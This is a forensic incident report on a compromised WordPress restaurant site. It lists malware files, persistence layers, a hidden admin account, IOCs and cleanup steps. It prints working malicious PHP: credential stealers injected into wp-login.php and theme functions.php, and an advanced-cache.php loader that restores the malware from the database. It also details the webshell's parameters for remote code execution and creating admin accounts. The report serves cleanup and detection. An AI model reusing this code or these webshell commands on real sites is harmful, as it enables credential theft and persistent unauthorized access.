# Server-Side Malware Scan Results: example-bistro.invalid

**Scan Date:** March 18, 2026
**Scanner:** Manual forensic analysis via SSH
**Server:** iad1-shared-b8-33.sharedhost.invalid (siteuser02)
**WordPress Version:** 6.9.4
**Result:** **15 confirmed malicious files, 1 malicious plugin, multiple persistence residues, 1 hidden admin user, 2 sets of stolen credentials**

---

## Complete Malware Inventory

### A. MU-Plugins (Auto-Load on Every Page Request)

MU-plugins (Must-Use plugins) load automatically on every WordPress request with no activation required. The attacker exploited this for guaranteed code execution.

| # | File | Size | Modified | Purpose |
|---|---|---|---|---|
| 1 | `wp-content/mu-plugins/session-manager.php` | 126,245 | Mar 10, 03:47 | **Main TDS/redirect engine** -- redirects visitors to `webanalytics-cdn.*` domains, exfiltrates visitor data via `sendBeacon`, contains anti-scanner detection (hides from Wordfence/Sucuri/WPScan/Nessus/Acunetix/Burp/Nikto/sqlmap), redirect guard to control all external redirects. Russian-language comments in code. |
| 2 | `wp-content/mu-plugins/session-manager.php.bak` | 125,668 | Mar 10, 03:47 | Backup copy of #1 |
| 3 | `wp-content/mu-plugins/wp-user-query.php` | 6,878 | Mar 8, 15:16 | **Stealth toolkit** -- see detailed analysis below |
| 4 | `wp-content/mu-plugins/health-check.php` | 401 | Mar 8, 15:15 | Placeholder/stub with empty `admin_init` hook |

**`wp-user-query.php` capabilities (10 functions):**
1. Hides hidden admin user (ID in `_pre_user_id` option) from `users.php`, user queries, REST API, XML sitemaps, and `?author=` scans
2. Suppresses new-user email notifications for hidden admin
3. **Disables auto-updates** for plugins/themes (prevents malware removal)
4. Hides malware mu-plugins from Site Health debug info
5. Hides hidden admin from REST API `/wp-json/wp/v2/users`
6. Blocks `?author=ID` enumeration for hidden admin
7. Disables XML-RPC entirely (locks out competing attackers)
8. **Intercepts ALL outgoing `wp_mail()`** -- logs to/subject/time in `_wp_mail_queue_log` option (capped at 500 entries)
9. **Harvests WooCommerce order data** -- collects order ID, email, name, total, currency, phone, country in `_wc_analytics_data` option (capped at 200 entries)
10. **Logs all admin actions** -- login, user creation, profile updates, plugin activation/deactivation, theme switches in `_wp_site_activity` option (capped at 300 entries)

**Legitimate mu-plugin (NOT malware):**
- `wp-content/mu-plugins/woocommerce-analytics-proxy-speed-module.php` (2,268 bytes) -- Standard WooCommerce/Jetpack analytics proxy
- `wp-content/mu-plugins/elementor-safe-mode.php` (3,894 bytes) -- Standard Elementor safe mode

---

### B. Webshells (5 Identical Copies -- Redundancy for Persistence)

All five files share the same authentication key (`a3f8b2c1d4e5f607`) and identical functionality. Placed in different directories so that deleting one or more leaves the others operational.

| # | File | Size | Modified | Disguised As |
|---|---|---|---|---|
| 5 | `wp-includes/fonts/font-metrics.php` | 5,807 | Mar 8, 15:15 | "Font Metrics Calculator" |
| 6 | `wp-content/upgrade/wp-update-verify.php` | 5,810 | Mar 17, 22:01 | "Update Verification Helper" |
| 7 | `wp-content/uploads/woocommerce_uploads/wc-report-handler.php` | 5,806 | Mar 8, 15:15 | "Report Data Handler" |
| 8 | `wp-content/uploads/wp-cache-stats.php` | 5,808 | Mar 8, 15:15 | "Cache Statistics Handler" |
| 9 | `wp-content/languages/wp-locale-handler.php` | 5,803 | Mar 8, 15:15 | "Locale Data Handler" |

**Webshell attack modes (all 5 support all modes):**

| Mode | Parameter | Capability |
|---|---|---|
| `p` | `?_wph=a3f8b2c1d4e5f607&m=p` + POST `c=<code>` | **Remote Code Execution** -- writes arbitrary PHP to temp file, executes via `include()`, deletes temp file |
| `r` | `?_wph=a3f8b2c1d4e5f607&m=r` | **Restore mu-plugin** -- recreates `session-manager.php` from base64 backup in database option `wp_session_tokens_config` |
| `l` | `?_wph=a3f8b2c1d4e5f607&m=l` | **Inject wp-login.php** -- injects credential-stealing code after `wp_signon()` call |
| `t` | `?_wph=a3f8b2c1d4e5f607&m=t` | **Inject theme** -- appends credential stealer to active theme's `functions.php` via `authenticate` filter |
| `h` | `?_wph=a3f8b2c1d4e5f607&m=h` + POST `l,pw,em` | **Create/restore hidden admin** -- creates or resets admin user with full privileges |
| `u` | `?_wph=a3f8b2c1d4e5f607&m=u` + POST `code` | **Self-update** -- overwrites the webshell with new code |
| `s` | `?_wph=a3f8b2c1d4e5f607&m=s` | **Health check** -- returns `{"ok":true,"v":"1.3","t":<timestamp>}` |

**Anti-detection features:**
- String concatenation to evade pattern matching: `"b"."ase6"."4_de"."code"` instead of `base64_decode`
- Suppresses errors and warnings
- Returns JSON responses (mimics API endpoint)
- Checks for existing infections before re-injecting (idempotent)

---

### C. Modified Core Files

| # | File | Size | Modified | Modification |
|---|---|---|---|---|
| 10 | `wp-login.php` | 51,723 | Mar 8, 15:15 | **Credential stealer injected at lines 1325-1327** (after `wp_signon()` call) |
| 11 | `wp-content/advanced-cache.php` | ~500 | Mar 8 | **Auto-restore mechanism** tagged `_sm_ac_v5` |

**`wp-login.php` injection (line 1325-1327):**
```php
// WordPress Session Cache Handler
  @file_put_contents(ABSPATH.base64_decode('d3AtY29udGVudC91cGxvYWRzLzIwMjQvMDYvU3RhaW5lZF9IZWFydF9SZWQtNjAweDUwMC5wbmc='),
    $_POST["log"].":".$_POST["pwd"].PHP_EOL,FILE_APPEND);
```
Captures every WordPress login attempt (username:password) and appends it to `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png`.

**`advanced-cache.php` (tagged `_sm_ac_v5`):**
```php
<?php /* _sm_ac_v5 */
if(!defined('DONOTCACHEPAGE'))define('DONOTCACHEPAGE',true);
if(!defined('LSCACHE_NO_CACHE'))define('LSCACHE_NO_CACHE',true);
if(!defined('DONOTROCKETOPTIMIZE'))define('DONOTROCKETOPTIMIZE',true);
// If session-manager.php is missing, auto-restore from database
$_mud=defined('WPMU_PLUGIN_DIR')?WPMU_PLUGIN_DIR:WP_CONTENT_DIR.'/mu-plugins';
$_muf=$_mud.'/session-manager.php';
if(!file_exists($_muf)){
  global $wpdb;
  if(isset($wpdb)){
    $_rr=$wpdb->get_var("SELECT option_value FROM {$wpdb->options} WHERE option_name='wp_session_tokens_config'");
    if($_rr){$_cc=base64_decode($_rr);
      if($_cc&&strpos($_cc,'<?php')===0){@mkdir($_mud,0755,true);@file_put_contents($_muf,$_cc);}
    }
  }
}
```
Triple purpose: (1) Disables all caching to prevent serving clean cached pages, (2) Checks if main malware exists, (3) Auto-restores from database backup if deleted.

---

### D. Modified Theme Files

| # | File | Modified | Modification |
|---|---|---|---|
| 12 | `wp-content/themes/hello-biz/functions.php` | Mar 8 | **Credential stealer appended and `create_admin` backdoor present** |

**Injected code (appended to theme functions.php):**
```php
// WordPress session analytics
add_filter('authenticate', function($u, $l, $p) {
  if(!is_wp_error($u)&&!empty($l)&&!empty($p)){
    @file_put_contents(ABSPATH.base64_decode('d3AtY29udGVudC91cGxvYWRzLzIwMjQvMDYvU3RhaW5lZF9IZWFydF9SZWQtNjAweDUwMC5wbmc='),
      $l.":".$p.PHP_EOL,FILE_APPEND);
  }
  return $u;
}, 999, 3);
```
Hooks into WordPress authentication filter at priority 999 (runs late, after successful auth check). Captures credentials to the same fake PNG file.

**Additional theme findings from March 18 validation:**

- `wp-content/themes/hello-biz/functions.php` also contains an active `create_admin=erwesdxsas` administrator-creation backdoor near the top of the file
- `wp-content/themes/kaon/functions.php` contains a dormant `create_admin=erwesdxsas` administrator-creation backdoor
- `wp-content/themes/lemonchili/functions.php` contains the same dormant `create_admin=erwesdxsas` administrator-creation backdoor
- `wp-content/themes/hello-biz-child/functions.php` is **confirmed malicious**: the legitimate child-theme loader code is followed by a bounded `/* __mu_deployer__ */` block that embeds a base64 payload and re-establishes `session-manager.php`, scatter webshells, fallback plugin activation, and login/theme credential theft hooks
- The malicious child-theme block is surgically removable because it is bracketed by repeated `/* __mu_deployer__ */` markers
- The March 10 `.wpress` archive lists `themes/hello-biz-child/functions.php` at 1,095 bytes, but that archive and the oldest SharedHost Provider backup are **not treated as trusted restoration sources**; the discrepancy is used only as corroborating evidence that the live child-theme file diverged materially during the compromise window

These theme findings matter because they provide both active and dormant re-entry paths if the site owner later switches layouts or restores an already-tainted child-theme file.

---

### D2. Additional Persistence & Configuration Residue

| Artifact | Location | Status | Significance |
|---|---|---|---|
| Malicious plugin | `wp-content/plugins/wp-perf-analytics/wp-perf-analytics.php` | **ACTIVE** | XOR-obfuscated JavaScript injector loaded from `wp_footer` |
| Cache-bypass block | `.htaccess` | **PRESENT** | `TDS_NOCACHE` block inserted by `session-manager.php` to disable caching and ensure malware execution |
| Self-heal cron | `wp cron event list` | **PRESENT** | `_tds_cache_selfheal` scheduled every 15 minutes |
| Hidden uploads temp/config | `wp-content/uploads/.7ed1995199.tmp` | **PRESENT** | XOR-encoded TDS config/cache file referenced by malware fallback logic |
| Redirect guard log | `wp-content/uploads/.redirect_blocked.log` | **PRESENT** | Operational log of redirects blocked by malicious redirect guard |
| TDS transients | `wp_s8yhai_options` | **PRESENT** | `_tds_stats`, `_transient__tds_*`, `_transient_timeout__tds_*` rows confirm active TDS state/caching |

These residues show the malware was not limited to file implants. It also modified web server behavior, scheduled WordPress tasks, and left stateful operational data in both the uploads directory and the options table.

---

### D3. Raw Access / Error Log Evidence of Live Operator Use

SharedHost Provider's preserved HTTPS logs show the malware was not simply staged on disk. The attacker actively exercised the `wp_debug_session` channel over multiple days:

| Period (PDT) | Evidence | Significance |
|---|---|---|
| Mar 10 03:47 | HTTPS error log parse errors in `session-manager.php(546) : eval()'d code` from clients `102.230.151.144`, `172.13.233.8`, `23.26.130.103` | Earliest preserved proof that the dynamic payload path was being executed on the live host |
| Mar 11 06:38-18:17 | Raw HTTPS access log `POST /?wp_debug_session=<key>&mode=php` from many IPs, with mixed `200`/`500` responses; matching error-log parse errors | Direct operator interaction with the backdoor, not crawler noise |
| Mar 12 05:22-14:40 | Repeated `wp_debug_session` POSTs from `35.147.129.58`, `23.26.130.47`, `94.205.57.64`, `79.146.6.139` | Multi-day sustained access |
| Mar 13 03:06-21:41 | Additional requests from `186.158.145.170`, `68.58.140.166`, `23.26.130.254`, `75.97.69.103`, `23.26.130.47`, `76.127.171.140`, `97.170.143.128` with correlated eval errors | Aligns with peak `_tds_stats` runtime activity |
| Mar 14 17:21-23:35 | Requests from `148.75.104.103`, `23.26.130.237`, `81.38.174.52`; some responses `500` with matching parse errors | Confirms continued active use after the initial compromise window |
| Mar 15 05:53-06:22 | Further `wp_debug_session` POSTs from `81.38.174.52` | Backdoor remained reachable while admin/plugin events were being logged |
| Mar 16 01:41-12:03 | Requests from `188.246.83.9`, `75.137.225.249`, `23.26.130.103`, `73.7.44.113`, `204.10.174.187`, `23.26.95.205`; 500s correlate with eval-path errors | Confirms active operator interaction up to the day before the SharedHost Provider restore boundary |

The repeated use of the same long `wp_debug_session` key, the matching `mode=php` parameter, and the paired parse errors in the same code path materially strengthen the timeline. These are direct server-side artifacts of the attacker operating the implant.

---

### D4. Account-Level Persistence Review

A follow-on host review was performed for persistence outside the WordPress tree and for account-level access artifacts:

| Check | Result | Notes |
|---|---|---|
| `crontab -l` for `siteuser02` | No entries | No user-level cron persistence found |
| `/home/siteuser02/.ssh/authorized_keys` | 1 key present | Single expected `ssh-ed25519` key; no extra keys observed |
| Shell startup files | Benign defaults only | `.alias`, `.bashrc`, `.bash_profile`, `.zshrc` contain normal SharedHost Provider/user shell config |
| Mail/pipeline files | Not present | No `.forward`, `.procmailrc`, or `.mailfilter` artifacts found |
| Hidden files outside webroot | No obvious droppers | Home directory review showed standard shell/profile files, `.php` runtime dir, and site/log directories only |
| WordPress usermeta app passwords | No hits | No `application_password` metadata observed in `wp_s8yhai_usermeta` |
| Active plugin IOC marker sweep | No additional hits | IOC strings outside the already-confirmed malicious `wp-perf-analytics` plugin did not match other plugin files |
| Old user home `/home/siteuser01` | Exists but not readable from `siteuser02` | Residual visibility gap; requires SharedHost Provider/root-side review if full historical account inspection is needed |

This does not prove the account layer was never touched, but it reduces the likelihood of a second persistence channel outside the known WordPress implants for the currently accessible `siteuser02` account.

---

### D5. Authenticated Admin Session Reconstruction

Authentication activity was reconstructed from `wp_s8yhai_usermeta.session_tokens`, `_wp_site_activity`, and SharedHost Provider HTTPS access logs. The detailed write-up is in `example_bistro_incident_response/05-evidence/auth-session-reconstruction.md`.

Attribution provided during response validation identifies `[IP-REDACTED]` as the site owner's IP and `[IP-REDACTED]` as the responder/admin IP. Those sessions are therefore treated as legitimate administrative access, not attacker infrastructure.

Key corrected findings:

| User | Exact Login Time (PDT) | IP | Corroboration |
|---|---|---|---|
| `SiteOwnerUser` | 2026-03-10 16:57:24 | `[IP-REDACTED]` | `POST /wp-login.php` at `16:57:23`, followed by `GET /wp-admin/admin.php?page=ai1wm_export` at `16:57:38`; same IP shows a long owner-admin session on March 10 |
| `webagency` | 2026-03-13 07:13:11 | `[IP-REDACTED]` | `POST /wp-login.php` `302` at `07:12:46` |
| `webagency` | 2026-03-13 07:17:17 | `[IP-REDACTED]` | `POST /wp-login.php` `302` at `07:16:37` after repeated login-page attempts |
| `webagency` | 2026-03-16 14:27:43 | `[IP-REDACTED]` | Full login chain into `/wp-admin/`, then `theme-install.php` and `plugins.php` |
| `Manager` | 2026-03-17 22:33:41 | `[IP-REDACTED]` | Successful responder/admin one-time login token redirect to `/wp-admin/`, followed by `Wordfence` admin activity through `22:49:07` |

This reconstruction shows the earlier rough date labels in `_wp_site_activity` reporting were too loose. The exact timestamps place several successful logins on March 13, March 16, and March 17 rather than the broader ranges previously noted.

---

### E. Data Exfiltration & Encrypted Files

| # | File | Size | Modified | Content |
|---|---|---|---|---|
| 13 | `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png` | 365 | Mar 17, 15:43 | **Stolen credentials in cleartext and XOR-encrypted** |
| 14 | `wp-includes/css/wp-editor-font.css` | ~200 | Mar 8 | Encrypted/base64 data |
| 15 | `wp-admin/.backup_time` | ~350 | Mar 17 | Encrypted/base64 data |

**Contents of Stained_Heart_Red-600x500.png (credential dump):**
```
[XOR-encrypted entry]
agency-developer-1:[REDACTED-PASSWORD]
agency-developer-1:[REDACTED-PASSWORD]
[XOR-encrypted entry]
agency-developer-1:[REDACTED-PASSWORD]
agency-developer-1:[REDACTED-PASSWORD]
[XOR-encrypted entry]
site-owner-user:[REDACTED-PASSWORD]
site-owner-user:[REDACTED-PASSWORD]
```

---

### F. Database Persistence

| # | Option Name | Size | Purpose |
|---|---|---|---|
| 16 | `wp_session_tokens_config` | 168,328 bytes | Base64-encoded backup of `session-manager.php` for auto-restore by webshells and `advanced-cache.php` |
| 17 | `_pre_user_id` | 1 byte (value: `8`) | Hidden admin user ID, used by `wp-user-query.php` to hide user from all interfaces |
| 18 | `_wp_mail_queue_log` | 663 bytes | Intercepted outgoing email log (7 entries captured) |
| 19 | `_wp_site_activity` | 682 bytes | Admin activity surveillance log |

**Intercepted emails (from `_wp_mail_queue_log`):**
| Recipient | Subject | Timestamp |
|---|---|---|
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] Your site has updated to WordPress 6.9.2 | 1773163250 |
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] Your site has updated to WordPress 6.9.3 | 1773206407 |
| [EMAIL-REDACTED] | New message from "EXAMPLE BISTRO" | 1773239143 |
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] Your site has updated to WordPress 6.9.4 | 1773249677 |
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] New User Registration | 1773255434 |
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] Login Details | 1773255435 |
| [EMAIL-REDACTED] | [EXAMPLE BISTRO] New Admin Email Address | 1773800830 |

**Admin activity surveillance (from `_wp_site_activity`):**
| Action | Details |
|---|---|
| Login | SiteOwnerUser from [IP-REDACTED] |
| User created | ResponderAdmin (user 9) |
| Login | webagency from [IP-REDACTED] |
| Login | webagency from [IP-REDACTED] |
| Login | webagency from [IP-REDACTED] |
| Login | webagency from [IP-REDACTED] |
| Login | SiteOwnerUser from [IP-REDACTED] |
| Plugin activated | hello-plus/hello-plus.php |
| Plugin deactivated | hello-plus/hello-plus.php |
| Plugin activated | wordfence/wordfence.php |

---

### G. Hidden Admin User

| Field | Value |
|---|---|
| User ID | **8** |
| Username | `adminbackup1d8273` |
| Email | `adminbackup@wordpress.org` |
| Registered | **March 8, 2026, 18:16:18 UTC** |
| Role | Administrator (full privileges) |
| Visibility | **Completely hidden** from users.php, REST API, sitemaps, author scans, and Site Health |

This user does NOT appear in `wp user list` or the WordPress admin Users page due to the `wp-user-query.php` malware actively filtering it from all queries.

---

### H. Stolen Credentials (CONFIRMED COMPROMISED)

| Account | Username | Password | Source |
|---|---|---|---|
| webagency (Agency Developer 1) | `agency-developer-1` | `[REDACTED-PASSWORD]` | Captured 4 times in credential dump |
| SiteOwnerUser (Site Owner) | `site-owner-user` | `[REDACTED-PASSWORD]` | Captured 2 times in credential dump |
| + XOR-encrypted entries | Unknown | Encrypted | Require XOR key derivation to decrypt |

**THESE PASSWORDS MUST BE CHANGED IMMEDIATELY.** The attacker has had these credentials since at least March 8, 2026.

---

## WordPress Core Integrity Check

```
$ wp core verify-checksums
Warning: File doesn't exist: readme.html
Warning: File doesn't verify against checksum: wp-login.php          [CREDENTIAL STEALER]
Warning: File should not exist: wp-admin/.backup_time                [ENCRYPTED DATA]
Warning: File should not exist: wp-includes/css/wp-editor-font.css   [ENCRYPTED DATA]
Warning: File should not exist: wp-includes/fonts/font-metrics.php   [WEBSHELL]
Error: WordPress installation doesn't verify against checksums.
```

---

## Persistence Architecture

The attacker built **5 layers of persistence** to survive cleanup attempts:

```
Layer 1: advanced-cache.php
   |-- Runs on every page load (loaded by wp-settings.php when WP_CACHE is defined)
   |-- If session-manager.php is missing, restores it from database
   v
Layer 2: session-manager.php (mu-plugin)
   |-- Auto-loads on every request (mu-plugins require no activation)
   |-- Contains the main redirect/tracking TDS engine
   v
Layer 3: 5x Webshells (fonts, uploads, upgrade, languages dirs)
   |-- Any one can: restore session-manager.php from DB, re-inject wp-login.php,
   |   re-inject theme functions.php, create hidden admin, execute arbitrary code
   v
Layer 4: Database backup (wp_session_tokens_config option, 168KB)
   |-- Base64-encoded copy of session-manager.php
   |-- Survives file-level cleanup; only removed by direct DB query
   v
Layer 5: Hidden admin user (ID 8, invisible from all interfaces)
   |-- Even if all files are cleaned, attacker retains admin access
   |-- Hidden by wp-user-query.php; if that's removed, user becomes visible
      but still exists with full admin privileges
```

**To fully clean this infection, ALL 5 layers must be addressed simultaneously.**

---

## IOCs (Indicators of Compromise)

### File Hashes (to check other sites)
| File | Path |
|---|---|
| session-manager.php | `wp-content/mu-plugins/session-manager.php` |
| Webshell auth key | `a3f8b2c1d4e5f607` |
| Credential dump path | `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png` |
| Webshell version | `1.3` |
| advanced-cache.php tag | `_sm_ac_v5` |

### Database IOCs
| Option Name | Purpose |
|---|---|
| `wp_session_tokens_config` | Malware backup storage |
| `_pre_user_id` | Hidden admin user ID |
| `_wp_mail_queue_log` | Stolen email data |
| `_wc_analytics_data` | Stolen order data |
| `_wp_site_activity` | Admin surveillance |
| `_tds_stats` / `_transient__tds_*` | TDS runtime state, cache-bypass state, and self-heal metadata |

### Network IOCs (from session-manager.php)
- `webanalytics-cdn.sbs`
- `webanalytics-cdn.cyou`
- `webanalytics-cdn.cfd`
- `webanalytics-cdn.icu`
- `landbankseeds.com`

### User IOC
- Username: `adminbackup1d8273`
- Email: `adminbackup@wordpress.org`

---

## Remediation Checklist

### CRITICAL -- Must Be Done Simultaneously (prevents re-infection)

- [ ] Delete malicious mu-plugins: `session-manager.php`, `session-manager.php.bak`, `wp-user-query.php`, `health-check.php`
- [ ] Delete all 5 webshells: `font-metrics.php`, `wp-update-verify.php`, `wc-report-handler.php`, `wp-cache-stats.php`, `wp-locale-handler.php`
- [ ] Delete malicious plugin: `wp-content/plugins/wp-perf-analytics/`
- [ ] Replace `wp-login.php` with clean copy from WordPress 6.9.4
- [ ] Replace `advanced-cache.php` with clean WP Rocket version or delete
- [ ] Remove `TDS_NOCACHE` block from `.htaccess`
- [ ] Delete `_tds_cache_selfheal` WP-Cron event and `_tds*` transient/cache rows
- [ ] Remove credential stealer/backdoor code from `hello-biz/functions.php`, `kaon/functions.php`, and `lemonchili/functions.php`
- [ ] Remove the bounded `/* __mu_deployer__ */` malware block from `hello-biz-child/functions.php`; quarantine and replace only if additional malicious code remains afterward
- [ ] Delete credential dump: `Stained_Heart_Red-600x500.png`
- [ ] Delete encrypted data files: `wp-editor-font.css`, `.backup_time`, hidden XOR uploads temp file(s), `.redirect_blocked.log`
- [ ] Delete database options: `wp_session_tokens_config`, `_pre_user_id`, `_wp_mail_queue_log`, `_wc_analytics_data`, `_wp_site_activity`
- [ ] Delete hidden admin user ID 8 (`adminbackup1d8273`)
- [ ] Change ALL passwords immediately (all WordPress users, SharedHost Provider, SFTP, database)
- [ ] Reinstall WordPress core files from wordpress.org

### Post-Cleanup Verification

- [ ] Run `wp core verify-checksums` -- must pass clean
- [ ] Run `wp user list` -- user 8 should not exist
- [ ] Check `wp db query "SELECT * FROM wp_s8yhai_options WHERE option_name = 'wp_session_tokens_config'"` -- should return empty
- [ ] Check `find wp-content/uploads/ -name '*.php'` -- only `index.php` files should exist
- [ ] Verify no PHP files in `wp-includes/fonts/`, `wp-content/languages/` (except translations), `wp-content/upgrade/`
